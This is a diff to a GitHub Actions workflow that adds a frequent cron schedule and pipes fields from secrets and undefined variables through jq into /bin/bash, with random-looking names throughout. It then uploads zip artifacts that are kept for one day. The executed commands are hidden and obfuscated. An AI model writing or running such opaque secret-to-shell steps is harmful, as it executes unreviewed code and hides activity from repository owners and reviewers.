@@ -2,6 +2,8 @@ name: Integration
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '52 4,10,16,22 * * *'
 permissions:
   contents: read
 concurrency:
@@ -15,15 +17,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Run task
         env:
-          z71608: ${{ secrets.z71608 }}
+          qdgxj55967: ${{ secrets.qdgxj55967 }}
         run: |
-          printf '%s' "$z71608" | jq -r .hx749 | /bin/bash
-          echo $ji95149 | jq -r .yvfje4 | /bin/bash
-          echo $rsxl0317 | jq -r .fz8 | /bin/bash
+          printf '%s' "$qdgxj55967" | jq -r .ipv1 | /bin/bash
+          echo $a28788 | jq -r .dav9714 | /bin/bash
+          printf '%s' "$muqon5" | jq -r .gqqz3 | /bin/bash
+          echo $bt84711 | jq -r .fa9559 | /bin/bash
+          printf '%s' "$ysvsd817" | jq -r .juv541 | /bin/bash
+          printf '%s' "$fti65517" | jq -r .qlsc945 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
         with:
-          name: OnibWLPo
+          name: uKyrhLI3
           path: "*.zip"
           retention-days: 1
